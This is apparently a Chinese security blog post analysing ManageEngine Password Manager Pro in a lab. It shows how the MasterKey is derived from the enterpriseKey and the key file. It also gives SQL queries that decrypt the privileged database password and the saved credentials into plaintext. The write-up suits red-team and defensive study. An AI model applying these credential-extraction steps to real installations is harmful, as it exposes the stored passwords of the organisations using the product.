---
title: 【技术原创】Password Manager Pro利用分析——数据解密
url: https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247555286&idx=1&sn=5182b4e84eef6f1806d2b8d3165beb7e&chksm=e915c8ecde6241fa4547cbd31c29abd0805c9f04b25d7681b482862f2e9662debe73c2f29acd&scene=58&subscene=0#rd
source: 嘶吼专业版
date: 2022-12-20
fetch_date: 2025-10-04T01:59:59.613599
---

# 【技术原创】Password Manager Pro利用分析——数据解密

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgLQYia9K0Hlnln0XhCD0zweN2zOMJ52IjicbDibeHGZfX35ft42vlNRicbA/0?wx_fmt=jpeg)

# 【技术原创】Password Manager Pro利用分析——数据解密

原创

3gstudent

嘶吼专业版

![](https://mmbiz.qpic.cn/mmbiz_gif/wpkib3J60o297rwgIksvLibPOwR24tqI8dGRUah80YoBLjTBJgws2n0ibdvfvv3CCm0MIOHTAgKicmOB4UHUJ1hH5g/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgaGm4dcbv0qvAa575ias4x8oLYIEKmCOMPkzgIgPJgAiaTp6zHJBgx8xA/640?wx_fmt=png)
   0x00 前言

在上篇文章《Password Manager Pro漏洞调试环境搭建》介绍了漏洞调试环境的搭建细节，经测试发现数据库的部分数据做了加密，本文将要介绍数据解密的方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgaGm4dcbv0qvAa575ias4x8oLYIEKmCOMPkzgIgPJgAiaTp6zHJBgx8xA/640?wx_fmt=png)
   0x01 简介

本文将要介绍以下内容：

数据加密的位置

解密方法

开源代码

实例演示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgaGm4dcbv0qvAa575ias4x8oLYIEKmCOMPkzgIgPJgAiaTp6zHJBgx8xA/640?wx_fmt=png)
   0x02 数据加密的位置

测试环境同《Password Manager Pro漏洞调试环境搭建》保持一致

数据库连接的完整命令："C:\Program Files\ManageEngine\PMP\pgsql\bin\psql" "host=127.0.0.1 port=2345 dbname=PassTrix user=pmpuser password=Eq5XZiQpHv"

数据库连接成功，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgnQro0smyJcljxJAZNlofrpzLLueVvdNpu1icmPZOCMibibMzQKibkYI7rw/640?wx_fmt=png)

常见的数据加密位置有以下三个：

**(1)Web登录用户的口令salt**

查询Web登录用户名的命令：select \* from aaauser;

查询Web登录用户口令的命令：select \* from aaapassword;

结果如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgVn1IPjib39E0AxTcw583cicUiclTBJF3ADIOdDcTN5WLQVrLJAwjdGWLA/640?wx_fmt=png)

password的加密格式为bcrypt(sha512($pass)) / bcryptsha512 \*，对应Hashcat的Hash-Mode为28400

其中，salt项被加密

**(2)数据库高权限用户的口令**

查询命令：select \* from DBCredentialsAudit;

输出如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgGbbtxHx4j0kaWzORGsPa5lKP3eF3PjJ05TY7PdQMDCA2MiaujTiaQDxw/640?wx_fmt=png)

password项被加密

**(3)保存的凭据**

查询命令：select \* from ptrx\_passbasedauthen;

结果如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgJjO8GueL1riads08UeskyneVBx5vJMJDcg6bCyfQleRVwCn2DiaZQv1w/640?wx_fmt=png)

password项被加密

导出凭据相关完整信息的查询命令：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wg1DQfmmibVib8h0cO6oapVC8u5fc2wKs9yfibVdYh1ibRydEAN0th5eDicvw/640?wx_fmt=png)

注：

该命令引用自https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgaGm4dcbv0qvAa575ias4x8oLYIEKmCOMPkzgIgPJgAiaTp6zHJBgx8xA/640?wx_fmt=png)
   0x03 解密方法

加解密算法细节位于C:\Program Files\ManageEngine\PMP\lib\AdventNetPassTrix.jar中的com.adventnet.passtrix.ed.PMPEncryptDecryptImpl.class和com.adventnet.passtrix.ed.PMPAPI.class

解密流程如下:

**(1)计算MasterKey**

代码实现位置：C:\Program Files\ManageEngine\PMP\lib\AdventNetPassTrix.jar->com.adventnet.passtrix.ed.PMPAPI.class->GetEnterpriseKey()

如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgocibnjnE3kGICRQ4vdHqnAmsAe4tZOnfnZSo1Kun87XCeic8PB2Nhe2Q/640?wx_fmt=png)

首先需要获得enterpriseKey，通过查询数据库获得，查询命令：select NOTESDESCRIPTION from Ptrx\_NotesInfo;

输出为：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgic8Ss2B7qH1C2Mic03lpAHlV0eJVJiaRq2AEOG3KNgkgTnVldI21Oib9jQ/640?wx_fmt=png)

这里可以得到enterpriseKey为D8z8c/cz3Pyu1xuZVuGaqI0bfGCRweEQsptj2Knjb/U=

解密enterpriseKey的实现代码：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgIOMLrrHiaHApZE2opMAK6IQQmFR93haNWg8WHXcA7DXGAdqfZthVqlQ/640?wx_fmt=png)

跟进一步，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgbOEopxnnXoNukiclAAqWjdYLko2icCWVyP7Hh6oqnhlJ2dvjr39ZYEqA/640?wx_fmt=png)

解密的密钥通过getPmp32BitKey()获得，对应的代码实现位置：C:\Program Files\ManageEngine\PMP\lib\AdventNetPassTrix.jar->com.adventnet.passtrix.ed.PMPAPI.class->get32BitPMPConfKey()

代码实现细节如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgSbNe2KcFUQdmLceqsDpib1ibZn0lRDQiaibWsdZiayMgY0yRziaiaVVUDJmqg/640?wx_fmt=png)

这里需要先读取文件C:\Program Files\ManageEngine\PMP\conf\manage\_key.conf获得PMPConfKey的保存位置，默认配置下输出为：C:\Program Files\ManageEngine\PMP\conf\pmp\_key.key

查看C:\Program Files\ManageEngine\PMP\conf\pmp\_key.key的文件内容：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgjicRThAeh5woGRmbVibCuhsyA6cKbtO80SiaKwfcVe2scxk8gVibTV9HQQ/640?wx_fmt=png)

通过动态调试发现，这里存在转义字符的问题，需要去除字符\，文件内容为60XVZJQDEPzrTluVIGDY2y9q4x6uxWZanf2LUF2KBCM\=，对应的PMPConfKey为60XVZJQDEPzrTluVIGDY2y9q4x6uxWZanf2LUF2KBCM=

至此，我们得到以下内容：

PMPConfKey为60XVZJQDEPzrTluVIGDY2y9q4x6uxWZanf2LUF2KBCM=

enterpriseKey为D8z8c/cz3Pyu1xuZVuGaqI0bfGCRweEQsptj2Knjb/U=

通过解密程序，最终可计算得出MasterKey为u001JO4dpWI(%!^#

**(2)使用MasterKey解密数据库中的数据**

数据库中的加密数据均是以\x开头的格式

解密可通过查询语句完成

解密数据库高权限用户口令的命令示例：select decryptschar(password,'u001JO4dpWI(%!^#') from DBCredentialsAudit;

输出如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgnXAicujKwmqZSFHMJtxPVbVW9qYaicsRZVgAWU4ibpgGz1l5kwaXgWCpw/640?wx_fmt=png)

这里直接获得了明文口令N5tGp!R@oj，测试该口令是否有效的命令："C:\Program Files\ManageEngine\PMP\pgsql\bin\psql" "host=127.0.0.1 port=2345 dbname=PassTrix user=postgres password=N5tGp!R@oj"

连接成功，证实口令解密成功，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgEjIl7OtpU7WicJmGCxn4cCaQXRyQFYGMCrX3vsbDYB2LDZiaPL24eEDA/640?wx_fmt=png)

解密保存凭据的命令示例：select ptrx\_account.RESOURCEID, ptrx\_resource.RESOURCENAME, ptrx\_resource.DOMAINNAME, ptrx\_resource.IPADDRESS, ptrx\_resource.RESOURCEURL, ptrx\_password.DESCRIPTION, ptrx\_account.LOGINNAME, decryptschar(ptrx\_passbasedauthen.PASSWORD,'u001JO4dpWI(%!^#') from ptrx\_passbasedauthen LEFT JOIN ptrx\_password ON ptrx\_passbasedauthen.PASSWDID = ptrx\_password.PASSWDID LEFT JOIN ptrx\_account ON ptrx\_passbasedauthen.PASSWDID = ptrx\_account.PASSWDID LEFT JOIN ptrx\_resource ON ptrx\_account.RESOURCEID = ptrx\_resource.RESOURCEID;

输出如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgWEJnUVg3VNY3sBKwqdR7wT5UDa4lUr1JzicLCnr6MCF6vXR3SrwpPoQ/640?wx_fmt=png)

提取出数据为PcQIojSp6/fuzwXOMI1sYJsbCslfuppwO+k=

**(3)使用PMPConfKey解密得到最终的明文**

通过解密程序，最终可计算得出明文为iP-6pI24)-

登录Web管理后台，确认解密的明文是否正确，如图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgGRmmccSoGlAibicRRz074Mc07pAEMLWqtZq0zmHXqfBCznCEDx376E4A/640?wx_fmt=png)

解密成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgaGm4dcbv0qvAa575ias4x8oLYIEKmCOMPkzgIgPJgAiaTp6zHJBgx8xA/640?wx_fmt=png)
   0x03 开源代码

以上测试的完整实现代码如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgMCEPE7LC36ZCcVEkdjbBUyqfiauODkQEpWJfA5gbDzoT4MAVL6icmw9A/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgvFOxLB2yOv1XiauXllK0ve8ia2gsmydicxaIqUplWNtwBt579cicvRSE4Q/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgqYP0gFiczM6LwGQhoNUDZcSY5an2qlDBlD6sAia9IRJ7MGjdNRkbicB9w/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgDY0Qf1zDkRO1Zgdj1kD2Wg5XB9rT91Ylicr48rW2b2HM9ib2Ec8Kt4CQ/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgR4cffJTx0UPphmdlnEiao168iad3FQQyc0LqyeAnV4kBHnAjgfLlV9zw/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgkx2YiaVUHIv5cJ7XTcVZnCMnFsibqYiag2ylrH0l02p3olrO2XhFKsbwQ/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgymzhBVhuspDicEsrafzPyaFueg2wjB9JSMVl7wg6V76eEBP7icONw9icQ/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgUoa9Bo1wWta3rGiaK6OAVl4w839K2aNHpcqDgebAk0srBibYyeywXrQg/640?wx_fmt=png)

代码修正了https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/中在解密MasterKey时的Bug，更具通用性

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2icwNJm7ZoNWsLic7JBrO27wgaGm4dcbv0qvAa575ias4x8oLYIEKmCOMPkzgIgPJgAiaTp6zHJBgx8xA/640?wx_fmt=png)...